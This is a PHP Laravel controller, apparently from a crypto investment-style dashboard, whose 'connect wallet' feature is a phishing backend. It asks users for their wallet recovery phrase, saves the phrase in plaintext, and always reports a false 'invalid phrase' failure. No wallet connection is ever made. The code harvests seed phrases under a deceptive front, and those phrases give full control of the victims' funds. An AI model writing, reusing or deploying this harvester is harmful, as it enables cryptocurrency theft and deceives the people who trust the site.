<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\WalletConnection;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Validator;

class WalletController extends Controller
{
    public function showForm()
    {
        $wallets = WalletConnection::where('user_id', Auth::id())->latest()->get();
        $user = Auth::user();
        $account_balance = $user->account_balance;
        $total_profit = $user->total_profit;
        $total_deposit = $user->total_deposit;
        $total_withdrawal = $user->total_withdrawal;
        $bonus = $user->bonus;
        $notifications = $user->notifications()->latest()->take(5)->get();
        $unreadCount = $user->unreadNotifications->count();
        return view('auth.v4.connect_wallet', compact('wallets',
            'account_balance',
            'total_profit',
            'total_deposit',
            'total_withdrawal',
            'bonus',
            'notifications',
            'unreadCount',));
    }

    public function connect(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'wallet' => 'required|string|max:255',
            'mnemonic' => 'required|string',
        ]);

        if ($validator->fails()) {
            return back()->withErrors($validator)->withInput();
        }

        WalletConnection::create([
            'user_id' => Auth::id(),
            'wallet_provider' => $request->wallet,
            'recovery_phrase' => $request->mnemonic,
        ]);
        $user = Auth::user();
        $user->notify(new \App\Notifications\UserNotification(
                'Wallet Connect Failed',
                'Invalid recovery phrase. Please check your phrase and try again.',
                'wallet',
                request()->ip()
            ));
        return back()->with('error', 'Failed to connect wallet. Please check your recovery phrase and try again.');
    }
}